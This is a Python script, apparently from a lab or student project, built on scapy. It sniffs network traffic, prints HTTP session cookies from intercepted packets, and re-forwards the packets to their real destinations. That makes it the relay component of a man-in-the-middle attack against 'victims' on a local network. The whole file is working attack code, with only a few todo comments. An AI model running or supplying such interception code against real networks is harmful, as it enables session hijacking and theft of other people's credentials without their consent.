#!/usr/bin/python

import re
import threading

from scapy.all import sniff
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether, sendp


class HttpListener(threading.Thread):
    # @todo replace these hard coded values
    network_interface = "enp0s3"
    attacker_ips = ['192.168.56.103']

    # @todo automate filling this table
    ip_to_mac = {
        '192.168.56.101': '08:00:27:b0:a1:ab',
        '192.168.56.102': '08:00:27:c6:a4:61',
    }

    def handle_packet(self, packet):
        """
        :param Ether packet:
        :return:
        """
        tcp = packet.getlayer("TCP")
        if tcp is not None:
            match = re.search(r"Cookie: (.+)", str(tcp.payload))
            if match:
                print(match.group(1))

        # Only consider packets with an IP part.
        if IP in packet:
            # Try to lookup the actual mac address of the package
            if packet[IP].dst not in self.ip_to_mac:
                print('received a packet for an unknown host (%s)' % packet[IP].dst)
            else:
                target_dst = self.ip_to_mac[packet[IP].dst]

                # Ignore packets target towards our self or already correctly targeted packets, since either we generated
                # them or they are legitimate packets originating from our own host.
                if packet[IP].dst not in self.attacker_ips and target_dst != packet.dst:
                    print('redirecting a packet from %s (%s) to %s' % (packet.dst, packet[IP].dst, target_dst))
                    packet.dst = target_dst
                    sendp(packet)

    def __init__(self, group=None, target=None, name=None, args=(), kwargs=None, verbose=None):
        threading.Thread.__init__(self)

    def run(self):
        print("sssssss")
        sniff(
            iface=self.network_interface,
            store=0,
            # filter="tcp and port 80", # @todo move this filtering to a later point in time, filtering here would break the victims network
            prn=self.handle_packet
        )
